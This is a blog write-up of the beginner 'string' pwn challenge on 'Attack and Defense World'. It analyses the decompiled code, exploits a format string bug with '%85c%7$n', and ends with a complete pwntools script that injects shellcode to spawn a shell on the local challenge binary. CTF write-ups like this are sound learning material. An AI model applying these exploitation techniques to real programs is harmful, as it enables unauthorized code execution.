---
title: "Pwn String WriteUp in 'Attack and Defense World'"
date: 2021-12-30
tags: ['CTF', 'Pwn', 'writeup', 'wp']
authors: [nova]
---

## Random Thoughts at the Beginning

Why is this Pwn challenge so difficult? Can't understand the WriteUp at all. ~~Quitting Pwn immediately~~

Anyway, let's start by taking down this newbie area of the Attack and Defense World.

After a few days of ~~not-so-systematic three days of fishing and two days of drying nets~~ studying, I can only say I am extremely confident now.

**String** should be the most interesting and challenging challenge in the novice area of the Attack and Defense World. Let's do this!

<!--truncate-->


## Let's Go

### Analysis
![exeinfope](https://cdn.ova.moe/img/image-20211101153717286.png)

![checksec](https://cdn.ova.moe/img/image-20211101153833049.png)

In summary, let's do a quick scan. There is no PIE in 64-bit.

Let's first look at the main function.

![main](https://cdn.ova.moe/img/image-20211101153942250.png)

v4 allocates memory of **8 bytes** to store the data `68, 85`, and then it prints out the addresses of these two data.

Let's dive into `sub_400D72()`.

![sub_400D72()](https://cdn.ova.moe/img/image-20211101154214749.png)

It asks us for a name, but the length of the input for 's' is checked, so no buffer overflow seems possible.

Let's continue to check the other functions. First, it's `sub_400A7D()`.

![sub_400A7D()](https://cdn.ova.moe/img/image-20211101154750528.png)

> As a side note for improving English skills, let's translate this(?):
>
> > This is a famous yet unusually different tavern. The air here is fresh, the marble floor is clean. There are hardly any noisy customers, and the furniture is not damaged as commonly seen in fights at other taverns in this world. The decoration is extremely gorgeous, looking like it belongs in a palace, but in this city, it's quite ordinary. In the center of the room are chairs and benches covered with velvet, surrounded by a large oak table. A large sign is fixed on a wall to the north behind a wooden strip. In one corner, you find a fireplace. There are two noticeable exits: east and up. Strangely, there is no one there, so where do you go?
>
> This background is not unattractive per se, but translating it feels like a waste of time.
>
> ~~I am a silly assistant~~

So, we are given the choice to go `east` or `up`, but looking at the code below, it seems we can only choose `east` (choosing `up` will lead you to an endless pit). Let's move on to `sub_400BB9()`.

![sub_400BB9()](https://cdn.ova.moe/img/image-20211101173616709.png)

Here, it mentions `address`, which easily connects to our earlier `v4`. It seems we need to manipulate v2 and the format string, but the exact operation is not clear yet. Let’s continue with `sub_400CA6()`.

![sub_400CA6()](https://cdn.ova.moe/img/image-20211101174119436.png)

This 'a1' is actually our initial v4, so we need to make `*v4 = v4[1]`.

Pay attention to `((void (__fastcall *)(_QWORD))v1)(0LL);`, this line converts v1 into an executable function (void as return type, __fastcall as a calling convention), meaning we can now inject shellcode. 

### Payload

The next step is how to achieve it.

Let’s write the first few fixed steps:

![exp_01](https://cdn.ova.moe/img/image-20211102105044906.png)

Now, we need to introduce the format string vulnerability, [learn more](https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/).

We need to find the position of v4 in the stack and craft our payload accordingly:

```python
payload = 'AAAA'+'.%x'*10
```

![addr_info](https://cdn.ova.moe/img/image-20211102105300535.png)

We see that our `41414141` is in the eighth position on the stack, and the v4_addr we wrote is in the previous position. At this point, we can craft a payload to make *v4=85:

```python
payload = '%85c%7$n'
```

![return_0](https://cdn.ova.moe/img/image-20211102105850378.png)

Now we have satisfied the conditions in `sub_400CA6()`, so we just need to inject a shellcode to get a shell.

Complete payload:

```python
from pwn import *
context(log_level='debug')

sh = process('./1d3c852354df4609bf8e56fe8e9df316')

sh.recvuntil('secret[0] is ')
v4_addr = int(sh.recvuntil('\n')[:-1], 16)
print(v4_addr)

sh.recvuntil('be:')
sh.sendline(b'yuusya')
sh.sendlineafter('east or up?:\n', b'east')
sh.sendlineafter('leave(0)?:\n', b'1')

# *v4 = 85
sh.sendlineafter("address'\n", str(v4_addr))
payload = '%85c%7$n'
sh.sendline(payload)
sh.recvuntil('I hear it')
context(arch='amd64', os='linux')
sh.sendlineafter('SPELL', asm(shellcraft.sh()))
sh.interactive()
```

<!-- AI -->
